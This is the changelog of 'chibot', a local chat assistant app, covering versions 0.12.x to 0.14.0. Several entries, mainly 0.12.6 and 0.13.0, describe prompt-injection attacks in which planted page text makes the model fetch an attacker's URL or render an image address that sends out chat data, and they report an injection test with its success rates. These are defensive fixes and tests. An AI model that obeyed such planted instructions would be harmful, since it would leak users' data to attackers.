# Changelog

All notable changes to the codebase are documented in this file. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning follows [Semantic Versioning](https://semver.org/)

## [Unreleased]

## [0.14.0] - 2026-11-09

### Added

- **Reranking for project search** (optional): with a server that has a `/rerank` route (llama.cpp's `llama-server`, vLLM, Jina, Cohere), set `rerank.baseURL` and `rerank.model` (**Settings → Other models → Project search** can change or empty the model). Search then has the reranking model read the 20 best passages next to the question and puts the one that answers it first. If the server fails, search keeps its own order. Its effect on the evaluation set is measured with `RETRIEVAL_RERANK_URL` (TESTING.md); Ollama has no such route.
- **Text before a question and before each file part** (Settings → Other models) for embedding models trained to expect an instruction (nomic-embed-text, embeddinggemma, e5, mxbai-embed-large): **Use what <model> expects** fills them in. On the project-search evaluation they raised the right passage's rank slightly (by a question or two out of about twenty, within the noise of a small test set). Changing the file one embeds the files again.
- **Mirror a folder** in a project: give the path of a folder on this machine and the project's files follow it. New and changed files are indexed, deleted ones removed, and unchanged ones are left alone. It updates when the project page opens and on **Sync now**; files added by hand stay, and **Stop mirroring** keeps the files.
- A larger project-search evaluation (`tests/server/projects/retrieval-docs.test.ts`): 87 questions plus 20 unanswerable ones over a frozen copy of the project docs, scoring first, third and sixth place and how close the best passage is.

### Changed

- **A copy of the database is kept before an upgrade changes it**: `chibot.db.before-upgrade` beside `chibot.db` (private to you, replaced by the next upgrade's), and startup says where it is.
- **Chats open faster as history grows.** The database gained an index on a chat's items (opening a chat took 25 ms at 200,000 items, now 0.08 ms) and one for project files, and runs in WAL mode, which makes the many small writes of a streaming answer about three times cheaper. Existing databases get the indexes on the next start; `chibot.db-wal` and `-shm` files now appear beside `chibot.db` while chibot runs.
- **Reasoning effort has one list of levels**, in the composer and in Settings → Model: Auto, then Minimal to Max, each with a hint. The composer's Fast and Thinking modes (low and high under other names) and the model menu's Reasoning effort sub-menu, and the effort shown after the model name, are gone. **None** is no longer offered (a saved `none` still works and shows until you change it).

### Fixed

- The switches of an MCP server in Settings → Tools (on or off, **Ask before using its tools**, and each tool) are written to the server's entry in the config file (`"disabled": true`, `"ask": true`, `"disabledTools": ["…"]`), not to chibot's database, so `config.json` shows them and editing them there works. Only what differs from the default is written. A switch an older version kept in the settings still applies to a server whose entry has no value of its own, and is cleared the first time you use that switch. Editing a server leaves its switches alone, and changing only a switch no longer reconnects the server on Reload.

## [0.13.3] - 2026-11-07

### Added

- When an answer finishes, fails or waits for a tool's approval while chibot is in a background tab, the page title gets a "•" until you are back; Settings → General → **Notify me about finished answers** also raises a browser notification (off until you turn it on and the browser agrees).
- A page left open while chibot was updated says so: "chibot was updated. Reload to use the new version." with a Reload button, checked whenever the page comes back to the front (the health check now reports which build of the web app is served).
- **Branch in new chat** under an answer copies the chat up to the end of that turn into a new chat (titled "Branch · …", in the same project), to try another direction without touching the original. The summaries that apply and the pictures and files the copied messages use come along, so deleting either chat leaves the other whole. Not offered in a temporary chat.

### Changed

- Dev tools: `pnpm seed:perf` fills a scratch data folder with many chats and one very long chat, and `pnpm measure:chat` times opening it, scrolling and typing; the numbers (a 500-turn chat with 10 MB of tool results opens in about a third of a second) are in TESTING.md.
- Docs only: AGENTS.md (read into every session) is 70 lines shorter: "Adding a tool" and "Testing" moved to [TOOLS.md](TOOLS.md) and [TESTING.md](TESTING.md), which it points to.
- chibot refuses to start when `server.host` is beyond this machine and no token is set (it only warned before): anyone who could reach it would spend your API key and, in Settings, add MCP servers that run commands. `chibot --allow-open` (or `CHIBOT_ALLOW_OPEN=1`) starts it anyway, for a firewall or proxy that already restricts who can reach it.

### Fixed

- A page left open across a rebuild no longer breaks when a part of the app that loads on demand (the Markdown renderer) is gone: it reloads once for the new build (drafts are kept), and a message still shows as plain text if the renderer can't load at all.
- One message that fails to draw no longer takes the page with it: it shows "This message could not be displayed" with Try again, and a failure of the whole page shows a Reload button instead of a blank window.
- A chat containing an item the page can't read (for example an import from elsewhere) now says "This chat could not be displayed: …" instead of staying blank.
- The start-up line that tells you to open chibot with `?token=` no longer says the token is "from .env" (it is in `config.json` or `CHIBOT_TOKEN`).
- Settings → Model reads the context window of an Ollama model that is loaded (`/api/ps`), which is what it actually runs with and differs by machine, not only a `num_ctx` set in the model; **Use N** then offers it. When that is below your Context window setting, the row says the server would cut the start of long chats without a word.
- `pnpm dev` no longer fails with "address already in use" when `PORT` is set in the environment (a tool that starts the dev server for Vite's port sets it): the API always runs on port 3000 in development.

## [0.13.2] - 2026-11-07

### Changed

- Code only: `ChatPage.tsx` is split into a top bar, a greeting, hooks for following the answer and for dropped files, and a tool-options helper; the fitting of a request to the context window moved out of `ChatService` into `chat/context-fit.ts`. Nothing they do has changed.
- Projects: the file card's Add note, Add files and Add folder, and the instructions card's Edit and Suggest from files, are icon buttons with tooltips like Settings'.
- Tooltips: every control with a `title` shows a styled tooltip after about a third of a second (the browser's waits a second, and shows nothing on keyboard focus), also on keyboard focus, above dialogs and never cut off by a scrolling panel.
- Settings: a row's actions (import, manage archived chats and memories, copy the backup command, add, reload, sign in and out, reconnect, edit and remove an MCP server, reset a model) are round icon buttons with tooltips, and every button in dialogs now has hover and pressed states.

### Fixed

- The Add and Edit MCP server dialog fitted badly in a short window (its buttons were out of sight below the fields). The fields now scroll and the buttons stay in view; name and kind, and command and folder, sit side by side.
- Toasts raised inside a dialog (copying the backup command or importing a chat in Settings, restoring in Archived chats) were hidden behind the dialog's backdrop. They are now in the top layer, above it, and look like an inverted pill with an icon (confirmation, failure or note) instead of a bordered card.

## [0.13.1] - 2026-11-07

### Added

- **Settings → Tools → Add server** adds, edits and removes MCP servers without editing the config file, with presets (web pages, Brave search, files in a folder). Keys in the environment and header rows are kept in the file and never shown again; it works only while chibot listens on this machine or `CHIBOT_TOKEN` is set.
- `chibot backup [folder]` and `chibot restore <folder> [--replace]` copy all chats, files, memories and projects to a folder and back (no keys or sign-ins included); Settings → Data shows the command.
- Select text in the chat and click **Quote** to add it to the message box as a quote.
- **+** → **Take a photo** attaches a picture from the device's camera: a preview opens, and nothing is captured until you click the shutter.

### Changed

- **Compact now** under the latest answer is an icon with a tooltip, like Copy and Regenerate, instead of a text link.

### Fixed

- A server that reports "the request is too long" inside the answer stream (a `response.failed` or `error` event before any text arrived) now gets the same recovery as one that refuses the request: the start of the chat is summarized harder and the request is sent once more. Once text has streamed, the error is shown as before.
- After **Undo** of a summary, the context size is estimated until the next answer reports one, instead of trusting a reading taken with the summary in place (it read low and could skip a needed summary).
- Importing a chat whose tool result is a list of parts instead of text is refused: chibot's tools answer in text, and context pruning relies on it.
- Closing a dialog opened inside Settings (a confirmation, the MCP server form) no longer also closes Settings.
- Long-chat summaries, from a review of the code: a usage reported before a summary was written no longer makes the next message summarize again (the kept messages carried the old, larger reading); the summary's own size counts in the estimate when no usage is known (it was counted as one token); a summary cut inside a long turn shows its divider and **Undo** (it was invisible); **Compact now** is offered in a chat with one long turn; two summaries of one chat can no longer be written at once; a trailing full stop on a link no longer marks a summary as having lost it.
- The summary request that shares the chat's prefix is sent only when it fits the context window (a server that cuts the front of an over-long input, such as Ollama, would summarize the wrong part), and it uses the chat's own, already shortened, input so the prefix matches.
- Only an error that says the request is too long (not any 400 mentioning "token" or "context") compacts and retries; such an error is no longer retried first without the optional request features.
- Summarizing starts no lower than a quarter of the window, however big the reserve; the summarizer is told to note, not obey, instructions found in tool results and pages.

## [0.13.0] - 2026-11-06

### Added

- **Long chats work on any server.** Past a share of the context window (the new setting `contextWindow`, 32,000 tokens by default, since compatible servers don't report theirs) chibot shortens old tool results (over 8,000 characters) and pictures (all but the newest two) in the request, and if that is not enough has the chat's own model write a summary of everything but the newest `keepRecent` tokens, cut at the start of a turn. The summary is saved as a `compactions` row beside the messages, which stay; requests start with it in `<conversation_summary>` tags. A divider in the chat opens to the summary, its model and size, with **Undo**; **Compact now** under the latest answer summarizes at once, with an optional focus. A summary that fails its checks (no `<summary>`, cut off, not shorter) is dropped and the chat goes on with the full history and a note; three failures in a row pause automatic summarizing for that chat; a server answer that the request is too long compacts harder and tries once more. New settings in Settings → Model: summarize on or off, context window, summarize at (75 %), reserve (16,000), keep recent (15,000). The meter shows the context against the window.

- Images, sound and video from other sites can be shown in answers. They are fetched by chibot's server (`GET /api/media`), never by the browser, whose page policy still only allows its own address (`media-src 'self' blob:` added beside `img-src`). One whose address the user wrote or a tool returned, exactly, shows by itself (`![](https://…)` as an image, a link to a sound or video as a player that can seek); any other, such as one a model wrote, shows "image from example.com" with **Load** and **Open**, because a model under a planted page's influence could add the user's data to an address (`…?d=<chat>`) and have it sent without a click. The server checks the same rule, so the page cannot skip it, and fetches only public addresses (every connection checked, redirects too, so `localhost` and the local network are refused), only PNG, JPEG, GIF, WebP, common audio and MP4/WebM/Ogg video (never SVG or HTML) up to 20 MB, 100 MB and 500 MB, with no cookies or referrer, and answers only requests the browser marks same-origin. Until a new chat is saved, an image stays a link.

- **Reading the window from the server.** Settings → Model offers **Use N** when the server reports the chat model's context window: from the model list (`context_length` on OpenRouter, `max_context_length` on LM Studio) or Ollama's `num_ctx` when the model sets one (`GET /api/models/window`). Nothing is guessed when it doesn't say.
- **Long agent turns can be summarized.** When the newest turn alone is more than twice the kept tail (many tool calls), the cut goes inside it, between whole tool rounds, never between a call and its output or a reasoning item and its call.
- **Summaries share the chat's prefix.** The automatic summary is asked for after the chat's own messages, with the chat's own instructions and tools (none can be called), so a server that caches prefixes has most of the request already; if that fails or gives no usable summary, the transcript request is used. Not used with a different summary model.
- An opt-in recall test with a real model (`tests/server/chat/recall.test.ts`, `RECALL_URL`, `RECALL_MODELS`): plants facts, summarizes, asks for them.
- **Summary model** (Settings → Model): a model on the same server to write the summaries of long chats, for example a smaller, faster one. Empty (the default) uses the chat's model.

### Changed

- `include: ['reasoning.encrypted_content']` is now an optional request feature like the reasoning effort: a server that rejects it (400) gets the request without, and later requests skip the failing attempt, instead of the chat failing.

### Removed

- OpenAI's own compaction (`context_management` in requests, the `compactThreshold` setting and the handling of `compaction` items): compatible servers such as Ollama ignored it, so long chats never shrank there. A stored `compactThreshold` is ignored and old `compaction` items are skipped.
- chibot's own **web search** (Brave) and **page reader** tools (`web_search`, `fetch_url`), and what only they used: the `braveApiKey` setting and `BRAVE_API_KEY`, the `undici` dependency, the unused `The web` tool section and globe icon, the `askAfterUntrusted` hook (nothing else used it) and the fake Brave API and test page of the e2e suite. Web search and reading pages come from MCP servers now (Settings → Tools). A `braveApiKey` left in `config.json` does not stop chibot starting: it is read without it, named in a note at startup, and left out the next time the file is saved. Chats made with the old tools still show their sources and tool rows.
- **What this changes for safety:** a page reader or search server that is an MCP server runs outside chibot, so chibot's refusal of addresses on this machine and your network no longer covers them, and nothing asks before it opens an address a page chose, unless you switch on **Ask before using its tools** for that server (do, for a server that reads pages or searches). Memory still asks first in a chat that used any MCP tool, and images from other sites still do not load unless their address is one you or a tool gave (see above).


### Added

- A `chibot` command (`src/server/cli.ts`, which `pnpm start` and a global `pnpm add -g .` run): `chibot` starts it (`--port`, `--host`), `chibot init` asks where the models are and for the key (not echoed) and writes the settings, `chibot config path|show|set` shows where everything is, shows the settings with keys as "set", and changes one (`chibot config set chat.model gpt-6-astra`; an empty value removes it), `--version`, `--help`. `pnpm add -g .` after `pnpm build` makes it available from any folder (`pnpm link -g` is rejected by pnpm 12).
- Settings and keys live in `config.json` (mode 0600, in a folder only you can open), which replaces `.env`. It has the same settings as the variables (`chat.baseURL`, `chat.apiKey`, `chat.model`, `image.*`, `embedding.*`, `transcription.*`, `braveApiKey`, `server.host`, `server.port`, `token`) and is checked strictly, so a misspelt one is an error. Precedence, highest first: flags, real environment variables, `config.json`, defaults. Settings are kept in `~/.config/chibot` (also on a Mac, not `~/Library`; `%APPDATA%\chibot\Config` on Windows) and data in `~/.local/share/chibot` (`%LOCALAPPDATA%\chibot\Data`), following `XDG_CONFIG_HOME` and `XDG_DATA_HOME`; a new `env-paths` dependency gives the Windows ones. `CHIBOT_CONFIG_DIR` overrides the first.
- `${NAME}` in `mcp.json` is filled from the real environment, then from an `env` block in `config.json`, so an MCP server's token lives with the other keys: `chibot config set env.GITHUB_TOKEN <token>` (an empty value removes it; `chibot config show` lists the names only). **Reload** in Settings → Tools reads the block again. The block reaches nothing but `mcp.json`: not chibot's own settings, and not the servers unless `mcp.json` passes a value on. A missing variable's error now says how to set it.

- MCP servers live in `config.json`, under `mcpServers` in the usual shape (what MCP servers' docs show pastes in as it is), so keys, tokens and servers are in one file readable only by you, and Reload in Settings → Tools reads it. A mistake in one is reported when loaded (as before) and does not stop chibot starting. The standalone `mcp.json` still works: it is used while `config.json` has no `mcpServers`, and always when `CHIBOT_MCP_CONFIG` names it; `chibot init` offers to move its servers into `config.json`. `chibot config show` lists the servers by name only, since their commands and headers can hold secrets.

### Changed

- Hardening found by testing the above in a clean copy and a real terminal: a leftover `.env` no longer overrides `config.json`; `chibot init` imports only what the `.env` holds, not your shell's variables; Ctrl+D or a closed input in `chibot init` says "Setup cancelled; nothing was saved." (exit 1) instead of Node's unsettled-await warning (exit 13); `chibot config path` still works when `config.json` is broken; a bad `token` (under 16 characters) or `baseURL` is refused when set, not at startup; configuration errors name the setting as well as the variable (`OPENAI_API_KEY (chat.apiKey): is not set …`); the data folder is created for the owner only (0700), and a data or config folder that other users of the machine can open (made earlier, or copied) is warned about at startup with the `chmod 700` to run, since the database file inside is readable by others unless its folder is not; and a linked `chibot` started before `pnpm build` answers with "web app is not built yet, run pnpm build" instead of a bare 404.
- The data folder and `mcp.json` default to the platform's folders instead of `<repo>/data` and `<repo>/mcp.json`. A checkout that has them, with the new places still empty, keeps using them and says where to move them at startup, so nothing is hidden.
- The `.env` in the chibot folder is still read, below `config.json` and the environment (so a leftover one never overrides a later `chibot config set`; it is read, not loaded into the environment), with a note at startup to run `chibot init`, which offers to move its values into `config.json`. A `.env` in the folder you run chibot from is no longer read: a command that runs from anywhere would otherwise take whatever keys that folder holds, and a hostile folder could point it at its own server (`OPENAI_BASE_URL`) to collect your key. `.env.example` is gone; the README lists every setting.
- Messages that told you to set something in `.env` now say what to run (`chibot init`, `chibot config set …`).

## [0.12.10] - 2026-11-04

### Added

- chibot can be installed as an app: a web manifest (`manifest.webmanifest`) and icons (192 and 512 px, a maskable one, and Apple's touch icon, drawn from the favicon) let Chrome, Edge and Safari open it in a window of its own. The manifest link sends credentials, so it also loads where a `CHIBOT_TOKEN` cookie is required. There is no service worker, deliberately: the server is local, so an offline copy of the page would only go stale after an upgrade.
- Voice input shows a clock and a level bar while it records, so it is clear the microphone hears you (on phones only the clock, to leave the message box its room). They are for the eyes; screen readers are told "Recording" and "Transcribing" once instead of hearing a timer.
- Links in an answer to a page it searched or read are numbered like the **Sources** list under it (which is numbered now), and hovering or focusing one shows a card saying which page it is (title, site, "Source 2 of 5"). Esc hides the card without also stopping the answer. Other links are left as they were.
- A tool call's row says what it came to without opening it: "Searched the web · 2 results", "Read web pages · example.com", "Created an image · a red robot", "Nothing found", or the first line of an error in red. MCP tools show the first line of their text.
- An answer that stopped early (stopped with **Stop**, or cut off by the model's output limit) says so under it, with **Continue** (asks the model to carry on from where it stopped) and **Regenerate** as labelled buttons, instead of only a small icon. Right after a Stop, only Continue is offered (regenerating needs the saved ids, which arrive when the chat reloads); a saved question with no answer at all says so, with **Try again**. It shows on the latest turn only, also after a reload.
- Settings that save as soon as they change (switches, menus, models, compaction, memory) show a brief "Saved" at the top of the panel (also announced), which goes after two seconds or when you change tab; a failed save shows its error instead. Personalization keeps its own Save button and message.

### Fixed

- The **Raw** disclosure in the approval card showed the browser's triangle as well as its own chevron.

### Changed

- The approval card says what it asks in words, not a tool's internal name: the tool's label, what it does and what leaves this machine (its summary), then why it is asking, set apart in a marked paragraph. For the web-page reader it says that nothing you wrote or searched for gave the address, so a page may have told chibot to open it to carry your data out; for memory, that other sites' text may be trying to plant a memory; for an MCP server's tool, which server it comes from and that you set it to ask. Each tool gives its own words (`Tool.approvalReason`, sent as `approval` in `GET /api/tools`). Settings now reload the tool list when an MCP server's switches change, so the card is not stale. The "Temporary chat" badge has a tooltip saying the chat is deleted when you leave it.

## [0.12.9] - 2026-11-04

### Added

- `?` opens the keyboard shortcut list when you are not typing in a text field (it is still a question mark in the message box); it is listed in the dialog.
- Code blocks have a **Wrap lines** toggle (long lines scroll sideways otherwise) and, from 12 lines, line numbers in a fixed column beside the code (they are left out of what is selected or copied, hidden from screen readers, and give way while lines wrap, since they would no longer line up). Copying code or a message is now also announced to screen readers ("Copied" / "Copy failed"); the button only changed its name, which isn't announced.
- An empty chat offers four ways to start (Summarize a page, Explain a topic, Draft an email, Review code): each puts the start of a message in the box, with the caret after it, for you to finish. They go once the chat has messages, and a temporary chat has none. An empty chat list in the sidebar says "No chats yet" instead of showing nothing.
- Toasts: brief feedback at the bottom of the window (`ui/toast.tsx`, also announced to screen readers through a polite live region). Archiving a chat says "Chat archived" with an **Undo** button, restoring, deleting and importing a chat say so too. A toast stays while the pointer or keyboard focus is on it, and goes after 6 seconds otherwise. Deleting is permanent, so it still asks first (undoing it would need chats to be kept after deletion, which they aren't).
- **Settings → Other models** sets the image, embedding (project search) and transcription (voice input) models, which could only be changed in `.env`. They apply at once, without a restart. `.env` keeps the servers and keys, and gives each model's starting value (`OPENAI_IMAGE_MODEL` and the like), shown as the placeholder with a **Reset** button; a model with no server or key in `.env` is greyed out saying what to set. An empty model turns the feature off: image tools are listed as unavailable (saying where to choose one), the microphone is disabled, and project search goes by keywords only. Changing the embedding model indexes the project files again in the background. A feature whose server is set up but whose model isn't (Ollama for chat, say) can now be switched on here instead of in `.env`: `Config` no longer drops an endpoint for lacking a model.

### Changed

- Accessibility is checked on rendered pages: an e2e spec runs axe (`@axe-core/playwright`, a new dev dependency) in both colour schemes over the new-chat page, an answer with code in six languages, maths, a table, a quote and a link, the menus, the image viewer, the search, shortcut, delete and Settings dialogs (every tab) and a toast, for WCAG 2.2 AA rules including colour contrast. It found the two fixes above. Also covered by new specs: following a streaming answer (and stopping when the user scrolls up, with and without reduced motion) and tablet, landscape and short-landscape screens, where nothing overflowed.
- The composer's **+** menu no longer offers **Search the web**; the model still searches when it needs to (it is switched on or off in Settings → Tools). **Create an image** stays, and now says what it does under its name, as **Add photos & files** does.

### Fixed

- The Delete button's text was white on the light red of the dark theme (2.5:1); it uses a new `--danger-fg` token (dark text there), and the colour test now checks it. Task-list boxes in answers (`- [x] done`) have a name ("Done" / "Not done"); they had none for a screen reader.
- Keyboard shortcuts no longer act on the page behind a modal dialog. With Settings open, New chat navigated behind it, Search stacked a second dialog on it and the sidebar toggled; now they wait until the dialog closes (Esc still closes it).
- **Import a chat** (Settings → Data) is a real button that a keyboard can reach; it was a label around a hidden file input, which Tab skipped.
- When chibot can't be reached (the server stopped while the page was open), a failed message says "Can't reach chibot. Check that it is running, then try again." instead of the browser's bare "Failed to fetch", also when the server goes away in the middle of an answer. The message stays in the box to be sent again. The chat list says the same, with a **Try again** button, and reloads by itself when the window is back in front or the network returns, instead of staying stale; the projects' own message isn't repeated.
- A message with other versions (an edit, a regenerated answer) shows its `< 2/3 >` switcher all the time, not only while hovered, so the versions can be found; copy and edit still wait for the pointer.
- Controls drawn as an icon alone now show a tooltip on hover: the sidebar's open/close button (and the rail's New chat, Search, New project, Settings and Keyboard shortcuts icons, which have no text when it is collapsed), the Send button, a chat's "…" button and an attachment's ×. An e2e spec lists every icon-only button and link on the new-chat page, in a chat, in the collapsed sidebar, on a project and in Settings, and fails for one without a tooltip.

## [0.12.8] - 2026-11-04

### Changed

- Colours are checked, and the ones that fell short are fixed. A new test (`tests/web/contrast.test.ts`) reads the colour tokens from `base.css` in both colour schemes and requires 4.5:1 for text and 3:1 for the edge of a field. It found: five code-highlight colours in the light theme under 4.5:1 (the orange for built-ins was 3.2:1), the grey of code comments in the dark theme on a card, and field borders at about 1.3:1, which don't show where a field is. Code colours are a little darker (light) or lighter (dark) in the same hues, and text fields (dialogs, project instructions, the settings fields, the model search, memory and chat renames) have a new `--border-control` edge at 3.4:1 or better; dividers and cards keep the faint `--border`.
- Controls are big enough for a finger on touch screens: icon buttons, message actions, the model and mode buttons, the message box, sidebar rows and a chat's "…" button are at least 44px (they were 28 to 36px), with the drawn icons unchanged inside. Only where the main pointer is coarse; other screens are as before.
- A touch screen no longer focuses the message box by itself on load, which raised the keyboard over the page; it is focused when tapped (a desktop still focuses it at once).
- Reduced motion is handled where each animation lives, not by freezing everything. The blanket rule also froze spinners, which then looked stuck. Now, for people who ask for less motion, spinners and the "thinking" dot fade instead of turning or shrinking (progress still shows), the two decorative shimmers stand still, transitions are off, and "Jump to latest" jumps instead of gliding (it was a JavaScript `behavior: 'smooth'`, which the CSS rule never reached).
- Text sizes follow the browser's font-size setting. The page's root was `16px` and every font size and line height was in `px`, so a user who had set a larger default size got no change. The root is now `100%` and the 77 sizes and line heights are in `rem` (the same on screen at the default size; the pixel-pinned layout specs pass unchanged), so a larger setting scales text and its line heights together. Heights and widths tied to the window use dynamic units (`dvh`, `dvw`) so they follow a phone's collapsing toolbar, and `100vw` is gone from the header menu's width.
- A long chat is cheaper to lay out. Turns that are offscreen are skipped (`content-visibility: auto` on `.turn`, with an estimated height of 600px until one has been drawn), so resizing the window or toggling the sidebar re-lays-out only what is on screen: for a 120-turn chat of code, tables and lists, 21.8 ms a pass became 0.5 ms (116 of the 120 turns skipped, in a 1280x800 window). Turns got 6px of padding, taken back by negative margins, so the spacing is unchanged and the focus rings of their first and last controls (which that property would clip) have room. Checked by e2e specs on an 80-turn chat: offscreen turns are skipped, it opens at the end, Jump to latest still works, the page doesn't move while skipped turns are measured, and the rings have room.

### Fixed

- The search dialog works with the keyboard and a screen reader. ArrowDown and ArrowUp move through the results (round the ends, the caret stays in the field), the result Enter opens is marked (before, Enter silently opened the first one, unmarked), the field is a combobox that names the marked result, the list is a listbox of options, and the number of chats found (or that none match) is announced. The pointer marks the result under it, so only one is ever highlighted.
- The phone sidebar drawer behaves like the overlay it looks like. Opening it left focus on the page, the chat behind the dimmed area could still be tabbed into, and Escape did nothing. Now the page behind is `inert`, focus moves into the drawer and returns to the button that opened it (which stays in the header, behind the drawer, for that), and Escape closes it, but not while a menu or dialog of the drawer is open (that takes its Escape first) and without also stopping an answer, which Escape does elsewhere.
- Keyboard focus is visible in the message box, the edit box of a sent message and the search field. They have no outline of their own (the first two sit inside a box), and the box showed nothing when they had focus, so only the caret marked it. The message box and edit box now draw a 2px outline when their textarea has focus (softer in the message box, which is focused most of the time), and the search field keeps the global ring, drawn inside it.
- **Add files** and **Add folder** on a project's Files card can be reached and pressed with the keyboard. They were labels around `hidden` file inputs, which no keyboard can focus, so Tab skipped them; they are real buttons now (`FilePickerButton`) that open the picker.
- The page outline starts at its title. The sidebar's "Projects" and group labels ("Today", …) were `h3` headings that came before the chat's `h1`, so a screen reader's heading list began at level 3. They are plain labels now. The "…" menus of a chat row and of a project are real menus (`role="menu"` with `menuitem`s), as the other menus already were. An e2e spec checks the outline on the new-chat page, in a chat and in Settings.
- Images in a chat load when they come near the screen (`loading="lazy"`, decoded off the main thread), and a generated image holds its space before it arrives, from the size the model asked for (square, landscape 3:2, portrait 2:3), so the chat below it doesn't jump; its "creating" placeholder has the same shape. A generated or edited image's alt text is now its prompt ("Generated image: a red robot", cut at 120 characters) instead of the same two words for every image.
- In forced-colours mode (Windows High Contrast) the open chat in the sidebar, the marked search result, the current Settings tab, a highlighted menu entry and a switch's on/off state were invisible, because that mode replaces backgrounds and these were shown by background alone. They use system colours (`Highlight`) now, the switch has an outline, and primary buttons have a border. An e2e spec emulates the mode.
- Small web-platform polish: the browser's own bars match the page (`theme-color` for light and dark, following a theme chosen in Settings, not just the system's); on a phone the on-screen keyboard resizes the page instead of covering the message box (`interactive-widget=resizes-content`); scrolling to the end of a list, menu, dialog or code block no longer scrolls the page behind it (`overscroll-behavior`); and headings that wrap (the greeting, dialog titles, Markdown headings) break evenly (`text-wrap: balance`).

## [0.12.7] - 2026-11-04

### Changed

- Search ranking was compared, not changed. The opt-in retrieval test now prints a table of ways to merge keyword and meaning search (reciprocal rank fusion with other constants and weights, score blends, each search alone), over the two question sets plus 8 new held-out paraphrases written before any variant was run, and for an index built with a model's task prefixes. With Ollama's `nomic-embed-text-v2-moe`: no merge beats the shipped one on both the tuning sets and the held-out one (the best on the tuning paraphrases, a 30% keyword blend, goes from 58% to 83% first hit there but loses a top-three question on held-out); the differences are one or two questions of 41, within noise. Prefixes (`search_query: ` / `search_document: `, which chibot does not send) lift meaning-only search a lot (held-out first hit 63% to 88%) but hybrid by about one question of 20, so they were not added. Finding better ranking needs a larger question set than this corpus gives.
- Code only: project search is `candidates()` (the keyword hits and those nearest in meaning, each with its score), `fuse()` (`projects/fusion.ts`, reciprocal rank fusion, a pure function with tests) and `passages()`, so ways of merging them can be compared; behavior is unchanged (the opt-in retrieval scores are identical).
- Dependencies updated within their ranges: `vitest` 5.1.0, `lucide-react` 1.67.0, `@vitejs/plugin-react` 6.2.1 and `@hono/node-server` 2.1.6 (no other package is behind; `pnpm audit --prod` is clean).

## [0.12.6] - 2026-11-04

### Fixed

- Text planted in a page, a search result or an old chat could make the model send your data to an attacker in two ways that needed no click or approval, both found while testing models against prompt injection. `fetch_url` ran without asking, so the model could be told to open `https://evil.example/c?d=<your data>`; and an answer could hold a Markdown image with such an address, which the browser loaded by itself. Now: once the chat holds text from others, `fetch_url` asks before opening an address that neither you nor a web search gave (exactly: anything added to one of those addresses makes it another, so it asks; `Tool.askAfterUntrusted` is the hook); the Markdown renderer shows an image from another site as a link to open on purpose, and the app's pages are served with `Content-Security-Policy: img-src 'self' data: blob:`, so the browser refuses one even if something slips through. Reproduced first, in a real browser (the page requested the other site's image itself) and in a unit test (`fetch_url` never asked); `tests/e2e/exfiltration.spec.ts` has the five checks, and the opt-in injection test now also runs each tool call a model obeyed through the approval gate (0 got past it on two local models, though they obeyed 3 of 12 and 4 of 12 tool attacks with no defense).

### Added

- Code only: `tests/server/chat/injection.test.ts` (opt-in: `INJECTION_URL` and `INJECTION_MODELS`) asks a real model to summarize a page with planted instructions (reply with one word, save a memory, fetch an attacker's URL), using chibot's own instructions and the real memory and fetch tools, and fails if the shipped prompt lets more than one attack in nine through or the model stops summarizing a harmless page. Run locally on three Ollama models (240 calls, 5 samples per case): attacks that worked with no defense 8, 5 and 7 of 15 (all memory and fetch attacks; none made a model reply with the planted word), with the instructions' rule alone 0, 1 and 0, with the banner on the page text alone 0, 3 and 1, and with both (as shipped) 0, 0 and 0 (one reply in 15 matched the planted word and could not be confirmed as obedience).
- Code only: `tests/server/projects/retrieval.test.ts` can also score search by meaning, when `RETRIEVAL_EMBEDDING_URL` and `RETRIEVAL_EMBEDDING_MODEL` name an embedding endpoint (skipped otherwise): it prints keyword-only against hybrid scores for the questions that repeat the passage's words and for 12 paraphrases, and fails if hybrid loses what keywords find or doesn't beat them on paraphrases. With Ollama's `nomic-embed-text-v2-moe`: paraphrases found among the first three hits 33% → 92% (first hit 33% → 58%); same-word questions 100% in the first three either way, first hit 90% → 86%.

## [0.12.5] - 2026-11-04

### Changed

- Code only: what `useChat.run` does with each streamed event (text, reasoning paragraphs, tool calls and outputs, and which events end or fail a response) is `applyEvent` in `chat/streamedAnswer.ts`, a pure function with 17 unit tests; `useChat` (469 → 394 lines) only does the side effects. The streaming e2e specs pass untouched.
- Code only: conversations and the chat are feature folders too: `src/server/conversations/` (the store, search and Markdown export: data only) and `src/server/chat/` (the turn loop, `ModelRequests`, `TitleWriter`, prompts, `refuseTurn` and the `/api/conversations` routes, which need both the chat and projects), each with an `index.ts`. The instruction writer's prompt moved into `projects/` and `section()` into its own `prompt-tags.ts`, so projects don't depend on the chat. The rules now fix the order `conversations` ← `mcp` / `projects` ← `chat`.
- Code only: MCP is a feature folder, `src/server/mcp/` (config, connections, OAuth sign-in, routes and the tool, with an `index.ts` and tests under `tests/server/mcp/`); the dependency rules now also require MCP code to be imported through its index and keep it independent of chat, conversations and projects.

## [0.12.4] - 2026-11-04

### Changed

- The import rules are checked, not only written down: `pnpm deps` (dependency-cruiser, rules in `.dependency-cruiser.cjs`, run by `tests/architecture.test.ts` inside `pnpm test`) fails on an import between the server and the web app, a cycle, a feature reaching up the layers (`ui` ← `conversations` ← `settings` / `projects` ← `chat`), a route importing `app.ts`, or code outside `src/server/projects/` bypassing its `index.ts`. It reads TypeScript through `@swc/core`, because dependency-cruiser's own TypeScript reader doesn't support TypeScript 7 yet.
- Code only: `ProjectHome.tsx` (555 lines, six components) is `ProjectHeading`, `ProjectDetails`, `ProjectFiles`, `ProjectInstructions` and `ProjectChats`, one file each, unchanged inside (the project e2e specs pass untouched).
- Code only: the web app's files are in feature folders: `chat/`, `conversations/` (the chat list, search, archive and delete dialogs), `projects/`, `settings/` (with Memories and the MCP helpers), and `ui/` (dialogs, popovers, hooks and shortcuts used by all); `App.tsx`, `Sidebar.tsx`, `ShortcutsDialog.tsx` and `http.ts` stay at the root. `DeleteChatDialog` moved from `ui/Dialog.tsx` to `conversations/` and `mcpToolName` from `chat/turns.ts` to `settings/mcp.ts`, so `ui` depends on no feature and `settings` on no chat code. Tests under `tests/web/` follow the folders.
- Code only: the web app's one `api.ts` is split by feature (`conversations/api.ts`, `chat/api.ts`, `projects/api.ts`, `settings/api.ts`), over the shared `http.ts` (`request`, `send`, `remove`, `uploadFile`). A stray doc comment on `regenerateTitle` now sits on `exportUrl`.

## [0.12.3] - 2026-11-04

### Changed

